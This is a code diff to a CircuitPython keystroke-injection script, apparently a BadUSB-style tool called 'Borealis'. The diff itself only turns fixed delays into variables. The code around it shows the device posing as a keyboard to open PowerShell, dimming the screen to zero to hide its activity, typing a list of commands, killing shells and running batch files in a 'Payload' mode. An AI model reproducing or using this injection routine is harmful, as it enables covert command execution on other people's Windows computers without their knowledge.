@@ -21,14 +21,15 @@ led.direction = digitalio.Direction.OUTPUT
 led.value = False
 with open("Borealis/settings.txt") as f:
     mode = str(f.readlines()[6]).replace("\n","").strip()
+d1,d2,d3=1,0.5,1.5
 #FUNCTIONS
 def hid():
-    time.sleep(1.25)
+    time.sleep(d1)
     kbd.send(Keycode.WINDOWS)
     layout.write('powersh')
-    time.sleep(0.25)
+    time.sleep(d2)
     kbd.send(Keycode.ENTER)
-    time.sleep(0.85)
+    time.sleep(d3)
     layout.write("(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 0)\n")
     layout.write(f'{";".join(lst)}\n')
     layout.write("taskkill /f /im pythonw.exe;./run.bat; timeout /t 1; taskkill /F /IM cmd.exe; (Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100); taskkill /F /IM powershell.exe\n")
@@ -65,12 +66,12 @@ elif mode == "False":
     #end loop here
     while True: led.value = True #FEEDBACK FINISHED
 elif mode == "Payload":
-    time.sleep(1.25)
+    time.sleep(d1)
     kbd.send(Keycode.WINDOWS)
     layout.write('powersh')
-    time.sleep(0.25)
+    time.sleep(d2)
     kbd.send(Keycode.ENTER)
-    time.sleep(0.85)
+    time.sleep(d3)
     layout.write(f'{";".join(lst)}\n./startup.bat\n')
 else:
     print("Not Accepted Mode")
